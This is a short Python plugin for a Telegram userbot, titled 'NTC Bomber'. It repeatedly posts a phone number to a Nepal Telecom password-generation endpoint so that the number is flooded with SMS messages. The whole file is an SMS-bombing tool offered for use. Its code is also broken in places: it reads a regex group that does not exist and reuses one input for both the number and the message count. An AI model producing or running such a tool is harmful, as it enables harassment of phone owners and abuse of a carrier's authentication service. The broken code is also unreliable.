"""NTC Bomber custom plugin by @scifidemon
Format .bomb [phone number]"""
import asyncio
import requests
from userbot.utils import admin_cmd
@borg.on(admin_cmd("bomb (.*)"))
async def _(event):
    num=0
    n=0
    input_str = event.pattern_match.group(1)
    input_str1 = event.pattern_match.group(3)
    if input_str:
        num = int(input_str)
    else:
        await event.edit("Enter a number!")
        return
    if input_str:
        n = int(input_str)
    else:
        await event.edit("Enter the number of messages to bomb!")
    paramss={"phone":num}
    await event.edit("Bombing....")
    for i in range (n):
        requests.post("https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
    await event.edit(f"Bombed {n} SMS to {num}")

    


